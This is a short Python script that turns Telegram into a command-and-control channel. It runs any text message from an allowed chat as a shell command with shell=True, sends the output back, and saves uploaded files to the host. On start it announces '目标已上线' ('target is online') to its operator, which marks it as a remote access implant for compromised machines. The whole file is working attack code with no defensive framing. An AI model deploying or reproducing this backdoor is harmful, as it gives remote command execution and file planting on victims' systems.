#!/usr/bin/env python
# -*- coding: utf-8 -*-
import tg # 导入token,id
import telepot,requests
import pprint # debug
import os
import time
from telepot.loop import MessageLoop
import subprocess

token = tg.token	# token='nnnnnnnnn:nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
known_ids = [tg.id]	# known_ids=['nnnnnnnnn']

def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids
	
def send_message(bot, chat_id, message):
	try:
		bot.sendMessage(chat_id, message)
	except Exception as err:
		print("[!] Error sending message: %s" % str(err))
	return
	
def get_file(bot,file_id,filename):
	final_filename = './uploads/' + filename
	bot.download_file(file_id, final_filename)
	
def handle(msg):
	content_type, chat_type, chat_id = telepot.glance(msg)
	if checkchat_id(chat_id):
		response =''
		file_name = ''
		file_id = None
		print(content_type, chat_type, chat_id)
		# pprint.pprint(msg)
		if content_type == 'text':
			command = msg['text']
			if command != '':
				bot.sendChatAction(chat_id, 'typing')
				message = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
				response = message.decode('gbk')
		elif content_type == 'document':
			file_id = msg['document']['file_id']
			file_name = msg['document']['file_name']
			get_file(bot,file_id,file_name)
			bot.sendChatAction(chat_id, 'upload_document')
			response = 'File saved as ' + file_name
		if response != '':
			if len(response)-1<4096:
				print(response)
				send_message(bot,chat_id,response)
			else:
				with open("output.txt","w") as f:
					f.write(response)
				bot.sendDocument(chat_id, open('output.txt', 'rb'))
				os.remove('output.txt')
				send_message(bot,chat_id,"太长了！！！")
		else:
			send_message(bot,chat_id,"无可奉告！")
bot = telepot.Bot(token)
MessageLoop(bot,handle).run_as_thread()
if len(known_ids) > 0:
	for known_id in known_ids:
		sayhi="目标已上线"
		send_message(bot, known_id, sayhi)
print('Listening ...')
while True:
	time.sleep(10)